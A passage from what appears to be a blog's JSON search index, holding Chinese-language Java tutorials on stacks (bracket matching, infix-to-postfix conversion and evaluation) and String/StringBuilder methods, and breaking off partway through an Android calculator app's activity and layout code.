f(1)；那么一共的顺序个数为 f(2) * f(1)。 a 在4号位置：a 最后出栈，即求前面 b，c，d 的出栈顺序，即子问题 f(3)。 结合所有情况，即：f(4) = f(3) + f(1)*f(2) + f(2)*f(1) + f(3)\n再规整化，定义 f(0) = 1，即：f(4) = f(0)*f(3) + f(1)*f(2) + f(2)*f(1) + f(3)*f(0)\n再推广至 n，即：f(n) = f(0)*f(n-1) + f(1)*f(n-2) + \u0026hellip; + f(n-2)*f(1) + f(n-1)*f(0)\n化简为递推公式：\n推出通项公式：\n中缀表达式转后缀表达式的思路 stack1 ⟺ 操作符；stack2 ⟺ 操作数 操作符：若 stack1 为空栈，则直接进栈 stack1。 若优先级比 stack1 栈顶元素高，则进栈 stack1。 若优先级比 stack1 栈顶元素低或相同，则弹出 stack1 栈顶元素至 stack2，再与 stack1 栈顶元素比较。 操作数：直接进栈 stack2。 最后清空 stack1 元素至 stack2，done。 Reference Catalan number：https://en.wikipedia.org/wiki/Catalan_number\nRegex：http://help.mythicsoft.com/filelocatorpro/cn/quickstart.htm , Java\nLaTeX：https://latex.codecogs.com/eqneditor/editor.php\n10进制 转 2进制 ---- public class A { public static void main(String[] args) { System.out.println(conversion(6, 2)); 6 转为 2进制 } private static StringBuilder conversion(int num, int n) { Stack\u0026lt;Integer\u0026gt; stack = new Stack\u0026lt;Integer\u0026gt;(); 新建一个栈 for (; ; ) { stack.push(num % n); 余数入栈 num /= n; if (num == 0) { break; } } return new StringBuilder(stack.toString()).reverse(); ① } } 注 ①： 1 1 0 ➜ [0, 1, 1] ➜ ]1 ,1 ,0[ ---- 输出： ]1 ,1 ,0[ ------------------------------------------------------- 括号配对问题（消消乐） ---- public class A { public static void main(String[] args) { System.out.println(isMatch(\u0026#34;(])\u0026#34;)); System.out.println(isMatch(\u0026#34;([[]()])\u0026#34;)); } private static boolean isMatch(String str) { Stack\u0026lt;Character\u0026gt; stack = new Stack\u0026lt;Character\u0026gt;(); 新建一个栈 for (int i = 0; i \u0026lt; str.length(); i++) { 扫描字符串 switch (str.charAt(i)) { case \u0026#39;(\u0026#39;: stack.push(\u0026#39;(\u0026#39;); 数据入栈 break; case \u0026#39;[\u0026#39;: stack.push(\u0026#39;[\u0026#39;); 数据入栈 break; case \u0026#39;)\u0026#39;: if (!stack.empty() \u0026amp;\u0026amp; stack.pop() == \u0026#39;(\u0026#39;) { 匹配成功，数据出栈 continue; } else { return false; } case \u0026#39;]\u0026#39;: if (!stack.empty() \u0026amp;\u0026amp; stack.pop() == \u0026#39;[\u0026#39;) { 匹配成功，数据出栈 continue; } else { return false; } } } return stack.empty(); 判断栈是否为空（其实到这步可以直接返回 true） } } ---- 输出： false true ------------------------------------------------------- 中缀表达式转为后缀表达式 ---- public class A { public static void main(String[] args) { String a = \u0026#34;1.8 + 5 / 8 * 1.6\u0026#34;; System.out.println(a + \u0026#34;\\n\u0026#34; + reverse(a)); } private static String reverse(String str) { Stack\u0026lt;String\u0026gt; stack = new Stack\u0026lt;\u0026gt;(); stack 原表达式 Stack\u0026lt;String\u0026gt; stack1 = new Stack\u0026lt;\u0026gt;(); stack1 操作符 Stack\u0026lt;String\u0026gt; stack2 = new Stack\u0026lt;\u0026gt;(); stack2 操作数 for (String i : reverseString(str.split(\u0026#34; \u0026#34;))) { 字符串 ➜ String 数组 ➜ 反转 ➜ 压入 stack stack.push(i); } for (; !stack.empty(); ) { stack(空) ➜ stack1 和 stack2 String i = stack.peek(); 预览栈顶元素 switch (i) { case \u0026#34;+\u0026#34;: 同一优先级操作符（低） case \u0026#34;-\u0026#34;: if (stack1.empty()) { 空栈直接进栈 stack1.push(stack.pop()); } else { 否则清空 stack1 至 stack2，再进栈 for (; !stack1.empty(); ) { stack2.push(stack1.pop()); } stack1.push(stack.pop()); } break; case \u0026#34;*\u0026#34;: 同一优先级操作符（高） case \u0026#34;/\u0026#34;: if (stack1.empty() || stack1.peek().equals(\u0026#34;+\u0026#34;) || stack1.peek().equals(\u0026#34;-\u0026#34;)) { stack1.push(stack.pop()); } else { 空栈直接进栈或者优先级比 stack1 栈顶元素高，否则弹出 stack1 栈顶元素至 stack2，再与 stack1 栈顶元素比较 stack2.push(stack1.pop()); } break; default: 操作数直接进栈 stack2 stack2.push(stack.pop()); break; } } for (; !stack1.empty(); ) { stack1(空) ➜ stack2 stack2.push(stack1.pop()); } String[] strings = new String[stack2.size()]; for (int i = 0, j = stack2.size(); i \u0026lt; j; i++) { stack2(空) ➜ String 数组 strings[i] = stack2.pop(); } String string = \u0026#34;\u0026#34;; for (String i : reverseString(strings)) { String 数组 ➜ 反转 ➜ 字符串 string += i + \u0026#34; \u0026#34;; } return string; } private static String[] reverseString(String[] str) { 反转数组 String[] strings = new String[str.length]; for (int i = 0, j = str.length; i \u0026lt; j; i++) { strings[i] = str[str.length - i - 1]; } return strings; } } ---- 输出： 1.8 + 5 / 8 * 1.6 1.8 5 8 / 1.6 * + ------------------------------------------------------- 后缀表达式求值 ---- public class A { public static void main(String[] args) { String a = \u0026#34;1.8 5 8 / 1.6 * +\u0026#34;; System.out.println(calculate(a)); } private static String calculate(String str) { if (str.matches(\u0026#34;.*0 /.*-.*\u0026#34;)) { 使用正则表达式匹配除以0，分别返回 \u0026#34;-∞\u0026#34; 或 \u0026#34;∞\u0026#34; return \u0026#34;-∞\u0026#34;; } else if (str.matches(\u0026#34;.*0 /.*+.*\u0026#34;)) { return \u0026#34;∞\u0026#34;; } Stack\u0026lt;String\u0026gt; stack = new Stack\u0026lt;\u0026gt;(); double a, b; for (String i : str.split(\u0026#34; \u0026#34;)) { 字符串 ➜ String 数组 ➜ 扫描 switch (i) { case \u0026#34;+\u0026#34;: 操作符则弹出栈顶2个元素进行运算，再将结果进栈 a = Double.parseDouble(stack.pop()); String ➜ double b = Double.parseDouble(stack.pop()); stack.push(String.valueOf(b + a)); double ➜ String break; case \u0026#34;-\u0026#34;: a = Double.parseDouble(stack.pop()); b = Double.parseDouble(stack.pop()); stack.push(String.valueOf(b - a)); break; case \u0026#34;*\u0026#34;: a = Double.parseDouble(stack.pop()); b = Double.parseDouble(stack.pop()); stack.push(String.valueOf(b * a)); break; case \u0026#34;/\u0026#34;: a = Double.parseDouble(stack.pop()); b = Double.parseDouble(stack.pop()); stack.push(String.valueOf(b / a)); break; default: 操作数直接进栈 stack.push(i); break; } } return stack.pop(); } } ---- 输出： 2.8 ","permalink":"https://xhstormr.github.io/blog/posts/java-stack/","summary":"","title":"Queue and Stack"},{"content":"Updated on 2016-10-09\nString：字符串常量 一旦被创建就不能修改它的值，而是通过重新创建一个新的对象并重新引用。 StringBuffer：字符串变量（线程安全） 对 StringBuffer 本身进行操作，更适用于对字符串的修改。 StringBuilder：字符串变量（非线程安全） 等价于 StringBuffer，应用于单线程，不执行同步操作。 性能：StringBuilder \u0026gt; StringBuffer \u0026gt; String\nString String str = \u0026#34;ABCDEFGH\u0026#34;; String.valueOf(1.687f) 1.687 转换为字符串 String.format(\u0026#34;%s-%d-%b\u0026#34;, \u0026#34;abc\u0026#34;, 3, true) abc-3-true 格式化字符串 str.length() 8 字符串长度 str.charAt(2) C 索引字符串 str.indexOf(\u0026#34;EFG\u0026#34;) 4 索引字符串 str.isEmpty() false 是否为空 str.contains(\u0026#34;ABC\u0026#34;) true 是否包含 str.equals(\u0026#34;ABC\u0026#34;) false 比较内容 str.regionMatches(0, \u0026#34;DABC\u0026#34;, 1, 3) true 比较部分内容 原从0开始，新从1开始，比较长度为3 str.startsWith(\u0026#34;ABC\u0026#34;) true 比较开头 str.endsWith(\u0026#34;ABC\u0026#34;) false 比较结尾 str.trim() 去除开头和结尾的空格 str.toLowerCase() abcdefgh 大小写转换 str.concat(\u0026#34;123\u0026#34;) ABCDEFGH123 追加 str.replace(\u0026#34;B\u0026#34;, \u0026#34; \u0026#34;) A CDEFGH 替换 str.substring(2, 6) CDEF 截取字符串 返回 String str.subSequence(2, 6) CDEF 截取字符串 返回 CharSequence str.split(\u0026#34; \u0026#34;) 以空格为分隔符，返回字符串数组 返回 String[] str.toCharArray() 返回字符数组 返回 Char[] str.matches(\u0026#34;.*0 /.*+.*\u0026#34;) 使用正则表达式匹配内容 Tips： 字符串索引范围从 0 开始，到 str.length()-1 结束。 indexOf 没有匹配结果会返回 -1。 substring 包括开始位置的字符，不包括结束位置的字符。 [2,6) StringBuilder and StringBuffer StringBuilder str = new StringBuilder(\u0026#34;ABCDEFGH\u0026#34;); str.toString(); ABCDEFGH 转换为String str.reverse(); HGFEDCBA 反转 str.setCharAt(1,\u0026#39; \u0026#39;); A CDEFGH 替换 str.append(123); ABCDEFGH123 追加 str.insert(1, \u0026#34;123\u0026#34;); A123BCDEFGH 插入 String str1 = \u0026#34;123\u0026#34;; 涉及 1 个对象（常量池中） String str2 = new String(\u0026#34;123\u0026#34;); 涉及 2 个对象（使用 new 关键字生成的对象会存放于堆区中） str1 == str2 false 显式 new 了一个对象，内存地址不相同 str1.equals(str2) true 内容相同 ------------------------------------------------------- public class A { public static void main(String[] args) { String str = \u0026#34;123456\u0026#34;; for (char i : new StringBuilder(str).reverse().toString().toCharArray()) { ① System.out.println(i); } } } 注 ①： String ➜ StringBuilder ➜ 反转 ➜ String ➜ char[] ---- 输出： 6 5 4 3 2 1 ------------------------------------------------------- public class A { public static void main(String[] args) { String str = \u0026#34;abcdef\u0026#34;; for (char i : str.toCharArray()) { System.out.println(i - \u0026#39;a\u0026#39; + 1); eg. b ➜ 98 - 97 + 1 = 2 } } } ---- 输出： 1 2 3 4 5 6 ------------------------------------------------------- public class A { URL 编码 public static void main(String[] args) { String format = String.format(\u0026#34;A=%s\u0026amp;B=%04d\u0026amp;C=%.2f\u0026#34;, \u0026#34;字\u0026#34;, 123, 123.123); String encode = URLEncoder.encode(\u0026#34;中国ABC\u0026#34;, \u0026#34;utf-8\u0026#34;); String decode = URLDecoder.decode(encode, \u0026#34;utf-8\u0026#34;); String s = String.format(\u0026#34;%-15s\u0026#34;, \u0026#34;A\u0026#34;); System.out.println(format); System.out.println(encode); System.out.println(decode); System.out.println(s + \u0026#34;B\u0026#34;); } } ---- 输出： A=字\u0026amp;B=0123\u0026amp;C=123.12 %E4%B8%AD%E5%9B%BDABC 中国ABC A B Note： %d Digital 123 %f Float 1.23 %s String \u0026#34;ABC\u0026#34; %c Char \u0026#39;A\u0026#39; %b Boolean true ------------------------------------------------------- public class A { Base64 编码 public static void main(String[] args) throws IOException { String str = \u0026#34;123ABC中国\u0026#34;; BASE64Encoder base64Encoder = new BASE64Encoder(); BASE64Decoder base64Decoder = new BASE64Decoder(); String encode = base64Encoder.encode(str.getBytes(\u0026#34;utf-8\u0026#34;)); byte[] decode = base64Decoder.decodeBuffer(encode); System.out.println(encode); System.out.println(new String(decode, \u0026#34;utf-8\u0026#34;)); } } ---- 输出： MTIzQUJD5Lit5Zu9 123ABC中国 ------------------------------------------------------- public class A { 判断是否为回文 public static void main(String[] args) { a(); 第一种方式 b(); 第二种方式 } private static void a() { String str = \u0026#34;12321\u0026#34;; String s = new StringBuilder(str).reverse().toString(); System.out.println(str.equals(s)); } private static void b() { String str = \u0026#34;12321\u0026#34;; int length = str.length(); int count = length % 2 == 0 ? length / 2 : (length - 1) / 2; for (int x = 0, y = 1; count != 0; count--, x++, y++) { if (str.charAt(x) != str.charAt(length - y)) { System.out.println(\u0026#34;false\u0026#34;); return; } } System.out.println(\u0026#34;true\u0026#34;); } } ---- 输出： true true ","permalink":"https://xhstormr.github.io/blog/posts/java-string/","summary":"","title":"关于 Java 中的 String"},{"content":"Updated on 2016-07-23\nFirstActivty.java package com.example.system.myapplication; import android.os.Bundle; import android.support.annotation.Nullable; import android.support.v7.app.AppCompatActivity; import android.view.View; import android.widget.Button; import android.widget.EditText; import java.util.Stack; public class FirstActivty extends AppCompatActivity implements View.OnClickListener { private Button btn_0; private Button btn_1; private Button btn_2; private Button btn_3; private Button btn_4; private Button btn_5; private Button btn_6; private Button btn_7; private Button btn_8; private Button btn_9; private Button btn_dian; private Button btn_jian; private Button btn_jia; private Button btn_cheng; private Button btn_chu; private Button btn_clear; private Button btn_delete; private Button btn_equal; private EditText editText; private String str = \u0026#34;\u0026#34;; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.first_activity); btn_0 = (Button) findViewById(R.id.btn_0); btn_1 = (Button) findViewById(R.id.btn_1); btn_2 = (Button) findViewById(R.id.btn_2); btn_3 = (Button) findViewById(R.id.btn_3); btn_4 = (Button) findViewById(R.id.btn_4); btn_5 = (Button) findViewById(R.id.btn_5); btn_6 = (Button) findViewById(R.id.btn_6); btn_7 = (Button) findViewById(R.id.btn_7); btn_8 = (Button) findViewById(R.id.btn_8); btn_9 = (Button) findViewById(R.id.btn_9); btn_dian = (Button) findViewById(R.id.btn_dian); btn_jia = (Button) findViewById(R.id.btn_jia); btn_jian = (Button) findViewById(R.id.btn_jian); btn_cheng = (Button) findViewById(R.id.btn_cheng); btn_chu = (Button) findViewById(R.id.btn_chu); btn_clear = (Button) findViewById(R.id.btn_clear); btn_delete = (Button) findViewById(R.id.btn_delete); btn_equal = (Button) findViewById(R.id.btn_equal); editText = (EditText) findViewById(R.id.editText); btn_0.setOnClickListener(this); btn_1.setOnClickListener(this); btn_2.setOnClickListener(this); btn_3.setOnClickListener(this); btn_4.setOnClickListener(this); btn_5.setOnClickListener(this); btn_6.setOnClickListener(this); btn_7.setOnClickListener(this); btn_8.setOnClickListener(this); btn_9.setOnClickListener(this); btn_dian.setOnClickListener(this); btn_jia.setOnClickListener(this); btn_jian.setOnClickListener(this); btn_cheng.setOnClickListener(this); btn_chu.setOnClickListener(this); btn_clear.setOnClickListener(this); btn_delete.setOnClickListener(this); btn_equal.setOnClickListener(this); editText.setOnClickListener(this); } @Override public void onClick(View view) { switch (view.getId()) { case R.id.btn_0: case R.id.btn_1: case R.id.btn_2: case R.id.btn_3: case R.id.btn_4: case R.id.btn_5: case R.id.btn_6: case R.id.btn_7: case R.id.btn_8: case R.id.btn_9: str += ((Button) view).getText().toString(); break; case R.id.btn_dian: if (!str.isEmpty() \u0026amp;\u0026amp; !str.matches(\u0026#34;.* \\\\S*\\\\.\\\\S*$\u0026#34;)) { 使用正则表达式防止重复输入 str += ((Button) view).getText().toString(); } break; case R.id.btn_jia: case R.id.btn_jian: case R.id.btn_cheng: case R.id.btn_chu: if (!str.isEmpty() \u0026amp;\u0026amp; !str.matches(\u0026#34;.*[+-/*] $\u0026#34;)) { 使用正则表达式防止重复输入 str += \u0026#34; \u0026#34; + ((Button) view).getText().toString() + \u0026#34; \u0026#34;; } break; case R.id.btn_clear: 清空 str = \u0026#34;\u0026#34;; break; case R.id.btn_delete: 退位 str = str.isEmpty() ? \u0026#34;\u0026#34; : str.substring(0, str.length() - 1); break; case R.id.btn_equal: 计算 str = str.isEmpty() ? \u0026#34;\u0026#34; : calculate(reverse(str)); break; } editText.setText(str); } ----- 后面代码可参考 \u0026#34;栈\u0026#34; ----- private static String reverse(String str) { 中缀表达式转后缀表达式 Stack\u0026lt;String\u0026gt; stack = new Stack\u0026lt;\u0026gt;(); Stack\u0026lt;String\u0026gt; stack1 = new Stack\u0026lt;\u0026gt;(); Stack\u0026lt;String\u0026gt; stack2 = new Stack\u0026lt;\u0026gt;(); for (String i : reverseString(str.split(\u0026#34; \u0026#34;))) { stack.push(i); } for (; !stack.empty(); ) { String i = stack.peek(); switch (i) { case \u0026#34;+\u0026#34;: case \u0026#34;-\u0026#34;: if (stack1.empty()) { stack1.push(stack.pop()); } else { for (; !stack1.empty(); ) { stack2.push(stack1.pop()); } stack1.push(stack.pop()); } break; case \u0026#34;*\u0026#34;: case \u0026#34;/\u0026#34;: if (stack1.empty() || stack1.peek().equals(\u0026#34;+\u0026#34;) || stack1.peek().equals(\u0026#34;-\u0026#34;)) { stack1.push(stack.pop()); } else { stack2.push(stack1.pop()); } break; default: stack2.push(stack.pop()); break; } } for (; !stack1.empty(); ) { stack2.push(stack1.pop()); } String[] strings = new String[stack2.size()]; for (int i = 0, j = stack2.size(); i \u0026lt; j; i++) { strings[i] = stack2.pop(); } String string = \u0026#34;\u0026#34;; for (String i : reverseString(strings)) { string += i + \u0026#34; \u0026#34;; } return string; } private static String[] reverseString(String[] str) { 反转数组 String[] strings = new String[str.length]; for (int i = 0, j = str.length; i \u0026lt; j; i++) { strings[i] = str[str.length - i - 1]; } return strings; } private static String calculate(String str) { 后缀表达式求值 if (str.matches(\u0026#34;.*0 /.*-.*\u0026#34;)) { return \u0026#34;-∞\u0026#34;; } else if (str.matches(\u0026#34;.*0 /.*+.*\u0026#34;)) { return \u0026#34;∞\u0026#34;; } Stack\u0026lt;String\u0026gt; stack = new Stack\u0026lt;\u0026gt;(); double a, b; for (String i : str.split(\u0026#34; \u0026#34;)) { switch (i) { case \u0026#34;+\u0026#34;: a = Double.parseDouble(stack.pop()); b = Double.parseDouble(stack.pop()); stack.push(String.valueOf(b + a)); break; case \u0026#34;-\u0026#34;: a = Double.parseDouble(stack.pop()); b = Double.parseDouble(stack.pop()); stack.push(String.valueOf(b - a)); break; case \u0026#34;*\u0026#34;: a = Double.parseDouble(stack.pop()); b = Double.parseDouble(stack.pop()); stack.push(String.valueOf(b * a)); break; case \u0026#34;/\u0026#34;: a = Double.parseDouble(stack.pop()); b = Double.parseDouble(stack.pop()); stack.push(String.valueOf(b / a)); break; default: stack.push(i); break; } } return stack.pop(); } } first_activity.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:padding=\u0026#34;5dp\u0026#34;\u0026gt; \u0026lt;EditText android:keepScreenOn=\u0026#34;true\u0026#34; 保持屏幕常亮 android:focusable=\u0026#34;false\u0026#34; 不可获取焦点 android:focusableInTouchMode=\u0026#34;false\u0026#34; 不可获取焦点 android:layout_weight=\u0026#34;2\u0026#34; android:background=\u0026#34;@drawable/view_bg\u0026#34; android:id=\u0026#34;@+id/editText\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;0dp\u0026#34; android:hint=\u0026#34;结果\u0026#34; android:textSize=\u0026#34;30sp\u0026#34; android:gravity=\u0026#34;end|bottom\u0026#34; android:padding=\u0026#34;20dp\u0026#34;/\u0026gt; \u0026lt;TableLayout android:layout_weight=\u0026#34;3\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;0dp\u0026#34; android:stretchColumns=\u0026#34;*\u0026#34; android:shrinkColumns=\u0026#34;*\u0026#34;\u0026gt; \u0026lt;TableRow android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;0dp\u0026#34;\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;C\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:textColor=\u0026#34;#ff7700\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_clear\u0026#34; android:layout_column=\u0026#34;0\u0026#34;/\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;DEL\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:textColor=\u0026#34;#ff7700\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_delete\u0026#34; android:layout_column=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;/\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_chu\u0026#34; android:layout_column=\u0026#34;2\u0026#34;/\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;*\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_cheng\u0026#34; android:layout_column=\u0026#34;3\u0026#34;/\u0026gt; \u0026lt;/TableRow\u0026gt; \u0026lt;TableRow android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;0dp\u0026#34;\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;7\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_7\u0026#34; android:layout_column=\u0026#34;0\u0026#34;/\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;8\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_8\u0026#34; android:layout_column=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;9\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_9\u0026#34; android:layout_column=\u0026#34;2\u0026#34;/\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;-\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_jian\u0026#34; android:layout_column=\u0026#34;3\u0026#34;/\u0026gt; \u0026lt;/TableRow\u0026gt; \u0026lt;TableRow android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;0dp\u0026#34;\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;4\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_4\u0026#34; android:layout_column=\u0026#34;0\u0026#34;/\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;5\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_5\u0026#34; android:layout_column=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;6\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_6\u0026#34; android:layout_column=\u0026#34;2\u0026#34;/\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;+\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_jia\u0026#34; android:layout_column=\u0026#34;3\u0026#34;/\u0026gt; \u0026lt;/TableRow\u0026gt; \u0026lt;/TableLayout\u0026gt; \u0026lt;LinearLayout android:layout_weight=\u0026#34;2\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;0dp\u0026#34; android:orientation=\u0026#34;horizontal\u0026#34;\u0026gt; \u0026lt;LinearLayout android:layout_weight=\u0026#34;3\u0026#34; android:layout_width=\u0026#34;0dp\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:orientation=\u0026#34;vertical\u0026#34;\u0026gt; \u0026lt;LinearLayout android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;0dp\u0026#34;\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;0dp\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;1\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_1\u0026#34;/\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;0dp\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;2\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_2\u0026#34;/\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;0dp\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;3\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_3\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; \u0026lt;LinearLayout android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;0dp\u0026#34;\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_weight=\u0026#34;2\u0026#34; android:layout_width=\u0026#34;0dp\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;0\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_0\u0026#34;/\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/button_selector\u0026#34; android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;0dp\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;.\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:id=\u0026#34;@+id/btn_dian\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; \u0026lt;/LinearLayout\u0026gt; \u0026lt;Button android:background=\u0026#34;@drawable/equal_selector\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;0dp\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;=\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:id=\u0026#34;@+id/btn_equal\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; \u0026lt;/LinearLayout\u0026gt; drawable view_bg.xml --- \u0026lt;shape xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; \u0026lt;corners android:radius=\u0026#34;5dp\u0026#34;/\u0026gt; 圆角 \u0026lt;solid android:color=\u0026#34;#f7de63\u0026#34;/\u0026gt; 填充色 \u0026lt;stroke 边框 android:width=\u0026#34;5dp\u0026#34; android:color=\u0026#34;#00ffffff\u0026#34;/\u0026gt; \u0026lt;gradient 渐变色 android:startColor=\u0026#34;#ffffff\u0026#34; android:endColor=\u0026#34;#ff0000\u0026#34;/\u0026gt; \u0026lt;/shape\u0026gt; ------------------------------------------------------- button_bg.xml --- \u0026lt;shape xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; \u0026lt;corners android:radius=\u0026#34;5dp\u0026#34;/\u0026gt; \u0026lt;solid android:color=\u0026#34;@color/beige\u0026#34;/\u0026gt; \u0026lt;stroke android:width=\u0026#34;5dp\u0026#34; android:color=\u0026#34;#00ffffff\u0026#34;/\u0026gt; \u0026lt;/shape\u0026gt; button_press.xml --- \u0026lt;shape xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; \u0026lt;corners android:radius=\u0026#34;5dp\u0026#34;/\u0026gt; \u0026lt;solid android:color=\u0026#34;@color/wheat\u0026#34;/\u0026gt; \u0026lt;stroke android:width=\u0026#34;5dp\u0026#34; android:color=\u0026#34;#00ffffff\u0026#34;/\u0026gt; \u0026lt;/shape\u0026gt; button_selector.xml --- \u0026lt;selector xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; \u0026lt;item android:drawable=\u0026#34;@drawable/button_press\u0026#34; android:state_pressed=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;item 